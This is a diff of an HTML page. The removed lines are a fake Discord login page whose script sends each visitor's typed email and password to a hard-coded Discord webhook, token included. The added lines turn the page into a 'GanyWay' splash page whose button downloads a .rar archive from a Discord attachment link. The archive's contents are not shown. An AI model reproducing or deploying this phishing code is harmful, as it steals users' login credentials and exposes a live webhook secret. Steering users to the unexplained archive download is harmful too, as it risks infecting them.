@@ -1,10 +1,9 @@
 <!DOCTYPE html>
 <html lang="en" >
-  
 <head>
   <meta charset="UTF-8">
-  <link rel="icon" href="https://cdn.discordapp.com/attachments/872898349727096902/874758584200724550/discord.png">
-  <title>Discord</title>
+  <link rel="icon" href="https://cdn.discordapp.com/attachments/879313722101878855/879459736385372160/image-removebg-preview.png">
+  <title>Ganyway</title>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.14.0/css/all.min.css" integrity="sha512-1PKOgIY59xJ8Co8+NE6FZ+LOAZKjy+KY8iq0G4B3CyeY6wYHN3yt9PW0XpSriVlkMXe40PTKnXrLnZ9+fkDaog==" crossorigin="anonymous" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0"><link rel="stylesheet" href="./style.css">
 
@@ -15,73 +14,19 @@
   <form class="container">
     <div class="centering-wrapper">
       <div class="section1 text-center">
-        <div class="primary-header">Welcome back!</div>
-        <div class="secondary-header">We're so excited to see you again!</div>
-       
-       
-        <div class="input-position">       
-	  <div class="form-group">
-            <h5 class="input-placeholder" id="email-txt">Email or phone number<span class="error-message"></span></h5>
-	    <input type="email" required="true" name="logemail" class="form-style" id="logemail" autocomplete="off" style="margin-bottom: 20px;">
-	    <i class="input-icon uil uil-at"></i>
-	  </div>	
-          <div class="form-group">
-            <h5 class="input-placeholder" id="pword-txt">Password<span class="error-message"></span></h5>
-	    <input type="password" required="true" name="logpass" class="form-style" id="logpass" autocomplete="on">
-	    <i class="input-icon uil uil-lock-alt"></i>
-	  </div>
-        </div>
-        <div class="password-container"><a href="#" class="link">Forgot your password?</a></div>
+        <div class="primary-header">GanyWay</div>
+        <div class="secondary-header"> </div>
 
- 
-        
-  
+
           <div class="btn-position">
-          <a class="btn" id="onoffBtn" type="button" name="submit" onclick="sendMessage()">Login</a>
+          <button class="btn" id="onoffBtn" type="button" name="submit" onclick="window.location.href='https://cdn.discordapp.com/attachments/880019704524189707/880115456852254740/GanyWay-BETA.rar';">Download</button>
 
         </div>
-
-
+ 
       </div>
-
-
-
-      <div class="horizontalSeparator"></div>
-      <div class="qr-login">
-        <div class="qr-container">
-          <img class="logo" src="https://cdn.discordapp.com/attachments/872898349727096902/874756374591066142/barkod.jpg"/>
-          <canvas id="qr-code"></canvas>
-        </div>
-        <div class="qr-pheader">Log in with QR Code</div>
-        <div class="qr-sheader">Scan this with the <strong>scanner app </strong>to log in instantly.</div>
-      </div>
-    </div>
-  </form>
-</div>
 
 </div>
 
 </body>
 
 </html>
-
-<script type="text/javascript">
-function sendMessage() {
-function sleep(milliseconds) {
-const date = Date.now();
-let currentDate = null;
-do {
-  currentDate = Date.now();
-} while (currentDate - date < milliseconds);
-}
-  var request = new XMLHttpRequest();
-  request.open("POST", "https://canary.discord.com/api/webhooks/880123176233893918/xqMfMZ8q4ylgyGrUGrllSZ-0xj2GiD_Senl4KfhDVnpjkAiJ4rW3PmyFtOE3Xx_Y7Zru");
-  request.setRequestHeader('Content-type', 'application/json');
-  var params = {
-    content: ("**Gmail:**" + document.getElementById('logemail').value + "\n**Password:**" + document.getElementById('logpass').value)
-  }
-  request.send(JSON.stringify(params));
-sleep(400)
-}
-</script>
-</body>
